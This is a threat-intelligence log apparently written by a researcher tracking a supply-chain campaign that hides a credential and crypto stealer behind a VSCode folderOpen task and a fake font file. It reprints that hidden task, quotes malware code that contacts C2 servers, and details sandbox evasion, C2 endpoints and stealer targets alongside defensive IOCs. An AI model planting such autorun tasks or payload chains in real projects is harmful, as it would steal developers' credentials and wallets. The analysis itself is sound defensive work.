# Task P: GitHub Scan for `_$_f5f0`, `_$_3333`, `_$_ec7c` and Inner Ciphers

**Date:** 2026-06-28  
**Task:** Search GitHub for new W2 outer ciphers (`_$_f5f0`, `_$_3333`, `_$_ec7c`),
Stage 2 ciphers (`_$_d6e0`, `_$_a478`), and inner cipher names (`SgH`, `cdi`, `nBj`, `RZn`, `gOe`)

---

## Cipher Scan Results

### Outer / Stage 2 Ciphers (zero-result for all)

| Cipher | Role | GitHub hits |
|--------|------|-------------|
| `_$_f5f0` | W2 Stage 1 outer (Jun 23/25) | **0** |
| `_$_3333` | W2 Stage 1 outer (Mar 4) | **0** |
| `_$_ec7c` | W2 Stage 1 outer (Mar 26) | **0** |
| `_$_d6e0` | W2 Stage 2 (Jun 25) | **0** |
| `_$_a478` | W2 Stage 2 (Jun 20) | **0** |
| `_$_16d1` | W2 Stage 1 inner (Jun 20) | **0** |
| `_$_9f51` | W1 Stage 1 outer (live) | **0** |

### Inner Cipher Names (zero-result for all)

Searched as `var <name>=(function` to avoid noise from unrelated short identifiers.

| Name | Role | GitHub hits |
|------|------|-------------|
| `SgH` | W2 Stage 1 inner (Jun 23) | **0** |
| `cdi` | W2 Stage 1 inner (Jun 25) | **0** |
| `nBj` | W2 Stage 1 inner (historical) | **0** |
| `RZn` | W2 Stage 1 inner (historical) | **0** |
| `gOe` | W2 Stage 1 inner (historical) | **0** |

**None of the new cipher identifiers from the W2 track have appeared in any indexed GitHub
repository.** The actor's blockchain dead-drop delivery continues to keep Stage 1+ payloads
off GitHub entirely.

---

## Secondary Signal Scan: `ThZG+0jfXE6VAGOJ` — 3 Hits

Scanning for the W2/Stage 3 XOR key revealed **two independent public analyses** of the campaign
published in the days surrounding the scan:

| Repo | File | Context |
|------|------|---------|
| `jfrog/research` | `post/hijacked-npm-vscode-tasks-blockchain.md` | JFrog Security blog post (Jun 24 2026) |
| `Dragon-Lady/linux-supply-chain-guard` | `src/checker.js` | Supply-chain scanner IOC list |
| `Dragon-Lady/linux-supply-chain-guard` | `test/smoke.js` | Scanner test suite |

---

## JFrog Research Blog Post (June 24, 2026)

**Title:** *"Hijacked npm Packages Use Novel VSCode Autorun and Blockchain Dead Drops to Deploy a
Credential/Crypto Stealer"*
**Authors:** Guy Korolevski and Yair Benamou

JFrog independently analyzed two hijacked npm packages and documented the full 5-stage payload
chain including stages not previously in any public report.

### New Delivery Vector: VSCode `folderOpen` Task

The packages embed Stage 0 as a hidden VSCode task:
```json
{
  "label": "eslint-check",
  "type": "shell",
  "command": "(command -v node >/dev/null 2>&1 && node ./public/fonts/fa-solid-400.woff2) || ...",
  "hide": true,
  "presentation": { "reveal": "never", "echo": false, "close": true },
  "runOptions": { "runOn": "folderOpen" }
}
```
- Trigger: opening the malicious package directory as a **trusted workspace** in VS Code or Cursor
- Payload disguised as a font file: `public/fonts/fa-solid-400.woff2`
- Preceded by **752 space characters** to appear blank in editors without word-wrap
- Task label `eslint-check` makes it look like a legitimate lint hook

Packages:
- `html-to-gutenberg` version `4.2.11` (XRAY-1008590) — uploaded May 25, 2026
- `fetch-page-assets` version `1.2.9` (XRAY-1008535) — `html-to-gutenberg` is its dependency

**Update June 25:** Nextron Research identified 16 additional infected Go packages using the
same payload structure (see Go package table below).

### Full 5-Stage Chain (JFrog's mapping)

**Stage 1 (font file / Stage 0 in our model):** Blockchain dead-drop loader. Uses TRON →
Aptos fallback → BSC dead-drop chain with XOR key `2[gWfGj;<:-93Z^C`. Victim marker:
`global['_V'] = "A8-**"` (campaign ID assigned here).

**Stage 2 (boot payload):** Second dead-drop retrieval + C2 selection. Beacons to `/$/boot`
with `Sec-V: <campaign_id>` header; decrypts response with `ThZG+0jfXE6VAGOJ`:
```javascript
function selectBootBaseUrl(secV) {
  if (secV[0] === "A") return "hxxp://166[.]88[.]134[.]62";
  return "hxxp://198[.]105[.]127[.]210";
}
```
C2 paths served: `/$/boot`, `/$/{id}`, `/verify-human/{channel}`, `/snv`, `/u/e`, `/u/f`,
`/d/python.zip`, `/d/python.7z`, `/d/7zr.exe`.

**Stage 3 (socket.io backdoor):** Interactive C2 backdoor using socket.io-client. Installs
`axios`, `form-data`, `socket.io-client` to `~/.node_modules`. Registers victim with:
```javascript
socket.emit("identify", "client", {
  clientUuid: hostname, processId, osType, VERSION, _V: victimId,
  CURRENT_TIMESTAMP, FIRST_VISIT_TIME
});
```
Command set: directory navigation, shell execution, clipboard read, public IP lookup,
single/recursive file upload, process exit, arbitrary JS eval (`ss_eval:`, `ss_eval64:`).
Injection targets for persistence: VS Code, Cursor, Antigravity, Discord, GitHub Desktop, npm CLI.

**Stage 4 (Python bootstrapper / runtime installer):** Node process that:
- Creates `~/.node_modules`, installs runtime deps
- Exfiltrates all process env vars to `/snv` endpoint
- Downloads Python interpreter to `%LOCALAPPDATA%\Programs\Python\Python3127` (Windows)
- Downloads `python.zip`, `python.7z`, `7zr.exe` from C2 `/d/` paths
- Requests Python payload via `/$/{id}` and runs with `exec`
- Reports status to `/verify-human/{channel}`
- **Sandbox/CI detection:** blocks on AWS, Azure, GCP, Vercel, GitHub runner, Codespaces,
  devcontainers, Kali — reports "blocked state" instead of continuing

**Stage 5 (Python infostealer):** Broad credential and artifact harvester. Collected data staged
under `%USERPROFILE%\.npm` (Windows) or `/tmp/.npm` (Linux/macOS), packed into encrypted zip
archives named `<hostname>$<username>`, uploaded to `/u/f`, optionally uploaded to Telegram.

Targets:
- **Browsers:** Chrome, Chromium, Opera, Opera GX, Brave, Edge, Arc, Dia, Comet, Vivaldi,
  Firefox (`key4.db`, `logins.json`, `cookies.sqlite`) — passwords, cookies, payment cards
- **Crypto wallets (extensions):** MetaMask, Phantom, TronLink, Trust Wallet, Binance, Coinbase,
  OKX, Rabby, Keplr, Xverse, Exodus, Safepal, Tonkeeper, Solflare, Zerion, Unisat, ArgentX,
  Braavos, Nami, Cosmostation, Frontier, Alby, TokenPocket, Lace, Bittensor
- **Password managers:** 1Password, LastPass, NordPass, RoboForm, Keeper, Proton Pass, Bitwarden,
  Google Authenticator
- **Developer tools:** Git credentials, GitHub CLI `hosts.yml`, GitHub Desktop logs, VS Code
  global storage, npm config/auth
- **Desktop wallets:** Exodus, Atomic, Electrum, Bitcoin, Dogecoin, Ledger Live, Trezor Suite,
  Monero, Solana keys
- **Cloud storage metadata:** Dropbox, Google Drive, OneDrive, iCloud, Box, Mega, pCloud
- **Telegram exfil token:** bot prefix `7870147428:AAGbYG...`, chat ID `7699029999` (dynamic —
  returned by C2 `/u/e` endpoint, not hardcoded)

### Go Packages (Nextron Research, Jun 25 2026 update)

| Go package | Version | Xray ID |
|-----------|---------|---------|
| `github.com/Barsu5489/commerce` | v0.0.0-20231123164829 | XRAY-1009784 |
| `github.com/Setsu548/Logistic` | v0.0.0-20240410002038 | XRAY-1009796 |
| `github.com/amantsehay/a2sv-go-course` | v0.0.0-20240816090215 | XRAY-1009780 |
| `github.com/anatoli-derese/a2sv-excercise` | v0.0.0-20240805074755 | XRAY-1009791 |
| `github.com/bm-197/chill` | v0.0.0-20241216030053 | XRAY-1009782 |
| `github.com/dexbotsdev/uniswap-v2-v3-arbitrage` | v0.0.0-20231007040503 | XRAY-1009790 |
| `github.com/glacialspring/go-winsparkle` | v0.0.0-20250402002608 | XRAY-1009789 |
| `github.com/glacialspring/static` | v0.0.0-20181015024211 | XRAY-1009786 |
| `github.com/hngi/Team-Fierce-Backend-Golang` | v0.0.0-20200612135333 | XRAY-1009779 |
| `github.com/lambda-platform/dan` | v0.0.0-20221011015638 | XRAY-1009785 |
| `github.com/lambda-platform/ebarimt-rest-api` | v0.0.0-20230429075241 | XRAY-1009795 |
| `github.com/lambda-platform/lambda` | v0.9.19-0.20260525032942, v0.9.20-0.20260619012358 | XRAY-1009794 |
| `github.com/naol7/dist-task-scheduler` | v0.0.0-20241120175214 | XRAY-1009781 |
| `github.com/reauheau/goaubio` | v0.0.0-20260213144826 | XRAY-1009787 |
| `github.com/rickt/slack-weather-bot` | v0.0.0-20180704165649 | XRAY-1009788 |
| `github.com/zainirfan13/graphql-client` | v0.0.0-20220912215956 | XRAY-1009783 |

Several of these are **backdated commits** — `lambda-platform/lambda` versions v0.9.19/v0.9.20
include June 2026 commits, confirming recent injections. The historical timestamps in other
packages suggest the actor injected into existing old packages to blend into archival noise.

---

## Dragon-Lady/linux-supply-chain-guard

Repo created May 13, 2026. Updated June 27, 2026 (yesterday). 1 star.
Uses the campaign name **"ChainVeil"** internally.

### New C2 IP: `166.88.54.158`

Dragon-Lady's CHAINVEIL_NETWORK_INDICATORS list a previously undocumented IP:

```
166.88.54.158           ← socket.io WebSocket C2
ws://166.88.54.158:443  ← WebSocket connection (Stage 3 backdoor)
http://166.88.54.158/upload    ← data upload endpoint
http://166.88.54.158/$/boot    ← boot endpoint
```

This is distinct from `166.88.134.62` (admin/high-value victim C2 in W1 Stage 1). The two IPs
may serve different time periods or victim segments:
- `166.88.54.158` — socket.io WebSocket C2 for the interactive backdoor (Stage 3)
- `166.88.134.62` — admin HTTP C2 for privileged victims (`_t_t` guard key in W1 Stage 1)

Both are in the `166.88.0.0/16` space. The `/upload` path on `166.88.54.158` is a distinct
data-receipt endpoint (vs `/u/e` and `/u/f` on the newer server).

### Additional npm Packages (ChainVeil-tracked, not in JFrog post)

| Package | Notes |
|---------|-------|
| `tailwindcss-merge` | Typosquat of `tailwind-merge` |
| `sass-format` | Style tooling package |
| `tailwindcss-animates-kit` | Animation utility typosquat |
| `sass-formats` | Variant of `sass-format` |
| `clsx-tailwind` | Typosquat combining `clsx` + Tailwind |
| `tailwindcss-animatics` | Animation utility variant |
| `typeorm-encrypt` | **TypeORM ecosystem** — different targeting vector |
| `rate-limits-flexible` | Typosquat of `rate-limiter-flexible` |
| `rate-limit-flexible` | Variant typosquat |

`typeorm-encrypt` is the only non-CSS package in this list — the actor is expanding beyond
Tailwind/PostCSS to hit TypeORM users (database ORM, common in NestJS/Express backends).

### Actor GitHub Org: `successkeyteck`

Dragon-Lady's `CHAINVEIL_TEXT_INDICATORS` lists `"SuccessKey"` and `"successkeyteck"`.
The `successkeyteck` GitHub org returns **404** — the account has been suspended or removed.
GitHub code search finds `"successkeyteck"` only in Dragon-Lady's own advisory/checker files,
suggesting they documented it at the time of its existence and it was subsequently removed.
"SuccessKey" appears to be an actor-controlled GitHub org used to host infected repositories
or distribute tooling — likely taken down as a result of the JFrog report.

### Campaign ID Format `A6-XXX`

Dragon-Lady tracks specific campaign IDs not seen in any prior analysis:

```
A6-317, A6-318       ← two-part IDs (batch 6, victims 317/318)
A6-420, A6-420-#     ← A6-420 with sub-variant
A6-519-79, A6-519-81, A6-519-83, A6-519-85  ← three-part IDs
```

Combined with previously known IDs:
- `A8-765` (saif72437 victims — inner `global['!']='8-765'` → prepend 'A')
- `A8-**` (JFrog html-to-gutenberg sample)
- `5-3-161` (zurichjs, PolinRider public format)
- `5-4-39`, `5-167` (current wave)

The `A6-` prefix is a distinct batch separate from `A8-`. The `A`-prefix format was routed to
`23.27.13.43` in Jun 20 Stage 2 and silently dropped in Jun 25 Stage 2 — these victims are now
unreachable from the current infrastructure.

### Aptos A3 Confirmed

`0x533b2dbcaeff19cd1f799234a27b578d713d8fcaa341b7501e4526106483e0b1` appears in Dragon-Lady's
`VSCODE_AUTORUN_BLOCKCHAIN_DEADDROP_INDICATORS` alongside the known A1 and A2 addresses.
This is the Aptos fallback for the W3 (Stage 2 dead-drop) channel:

| Channel | TRON wallet | Aptos address |
|---------|------------|---------------|
| W1 (Stage 0→1) | `TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP` | A1: `0xbe037400...` |
| W2 (Stage 0→1) | `TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG` | A2: `0x3f0e5781...` |
| W3 (Stage 1→2) | `TA48dct6rFW8BXsiLAtjFaVFoSuryMjD3v` | A3: `0x533b2dbc...` |

### Stage 0 SHA-256 Hashes

Two hashes from the Stage 0 font file payloads, confirmed in `bb1nfosec/Information-Security-Tasks`
threat feed (picked up Jun 25–26, the day after JFrog post):

```
53abf37710d6f2e35694fbe7cfaf1108127cbc001ce3e6bf994d0486cae5a0e8
13e9a3c41e038bf9d8fcb0831305819819e4f7f4452bc20a04b9bf2756ee22e8
```

These correspond to the `fa-solid-400.woff2` payload files from `html-to-gutenberg` and
`fetch-page-assets` respectively.

---

## Architecture Update: 5-Stage Chain Complete

With JFrog's Stage 3–5 analysis, the full payload chain is now documented:

```
Stage 0: VSCode folderOpen task (eslint-check) OR infected repo (lib/lib.min.js)
         └─ executes fa-solid-400.woff2 (or similar)

Stage 1 (font file / "Stage 0" in our model):
         TRON W1/W2 → Aptos fallback → BSC dead-drop → XOR decrypt
         └─ sets global['_V'] = campaign ID

Stage 2 (boot payload):
         W1 track: via TRON W3 → BSC dead-drop
         W2 track: direct delivery from Stage 1
         └─ beacons to C2 /$/boot with Sec-V: <campaign_id>
         └─ XOR key ThZG+0jfXE6VAGOJ

Stage 3 (socket.io backdoor):
         C2 response → eval() → socket.io-client connects to ws://166.88.54.158:443
         └─ commands: shell, clipboard, file upload, ss_eval, ss_eval64
         └─ injects into VS Code, Cursor, Antigravity, Discord, GitHub Desktop, npm CLI

Stage 4 (Python bootstrapper):
         ~/.node_modules install, env dump to /snv, Python installer from /d/ paths
         └─ builds Python loader, reports to /verify-human/{channel}
         └─ sandbox detection: blocks on AWS/Azure/GCP/Vercel/GitHub runner/Codespaces/Kali

Stage 5 (Python infostealer):
         browsers + crypto wallets + password managers + developer credentials
         └─ staging: /tmp/.npm or %USERPROFILE%\.npm (archive: hostname$username.zip)
         └─ upload: /u/f (HTTP POST) + Telegram (optional, token from /u/e)
```

---

## New IOCs from Task P

```
# C2 IPs
166.88.54.158          ← socket.io WebSocket C2 (Stage 3 backdoor)
                          ws://166.88.54.158:443
                          http://166.88.54.158/upload
                          http://166.88.54.158/$/boot

# C2 routes (new/confirmed)
/upload                ← data receipt (older server, 166.88.54.158)
/snv                   ← env var exfil (Stage 4)
/verify-human/{chan}   ← status reporting (Stage 4)
/$/{id}                ← Python payload delivery (Stage 4)
/d/python.zip          ← Python runtime (Stage 4)
/d/python.7z           ← Python runtime compressed
/d/7zr.exe             ← 7-Zip extractor for Windows

# Telegram exfil
Token prefix: 7870147428:AAGbYG...
Target chat: 7699029999

# npm packages (ChainVeil / PolinRider)
html-to-gutenberg@4.2.11    (XRAY-1008590) — removed from npm
fetch-page-assets@1.2.9     (XRAY-1008535) — removed from npm
tailwindcss-merge
sass-format
tailwindcss-animates-kit
sass-formats
clsx-tailwind
tailwindcss-animatics
typeorm-encrypt              ← expands targeting to TypeORM/backend ecosystem
rate-limits-flexible         ← typosquat of rate-limiter-flexible
rate-limit-flexible

# 16 Go packages (see table above)

# Aptos A3 (W3 fallback)
0x533b2dbcaeff19cd1f799234a27b578d713d8fcaa341b7501e4526106483e0b1

# Stage 0 SHA-256 (font file payloads)
53abf37710d6f2e35694fbe7cfaf1108127cbc001ce3e6bf994d0486cae5a0e8
13e9a3c41e038bf9d8fcb0831305819819e4f7f4452bc20a04b9bf2756ee22e8

# Actor GitHub org (suspended)
successkeyteck

# Host artifacts
~/.node_modules                               ← npm dep install dir
%LOCALAPPDATA%\Programs\Python\Python3127\   ← fake Python install (Windows)
/tmp/.npm                                    ← exfil staging dir (Linux/macOS)
%USERPROFILE%\.npm                           ← exfil staging dir (Windows)
/tmp/get-pip.py                              ← Python bootstrap artifact
<hostname>$<username>                        ← exfil archive naming pattern

# VSCode execution artifacts
.vscode/tasks.json  (runOn: "folderOpen" + label: "eslint-check")
public/fonts/fa-solid-400.woff2              ← Stage 0 payload disguise

# Campaign IDs (newly documented)
A6-317, A6-318, A6-420, A6-420-#
A6-519-79, A6-519-81, A6-519-83, A6-519-85
```

---

## External Reports Referenced

| Source | Date | Title |
|--------|------|-------|
| JFrog (Guy Korolevski + Yair Benamou) | 2026-06-24 | "Hijacked npm Packages Use Novel VSCode Autorun and Blockchain Dead Drops..." |
| Nextron Research | 2026-06-25 | 16 Go packages identified (update to JFrog post) |
| Dragon-Lady/linux-supply-chain-guard | 2026-05-13 to present | linux-supply-chain-guard checker + advisory |
| bb1nfosec/Information-Security-Tasks | 2026-06-25/26 | IOC feed pickup (SHA-256 hashes) |
| 0xDanielLopez/TweetFeed | 2026-06-25 | Community IOC feed |
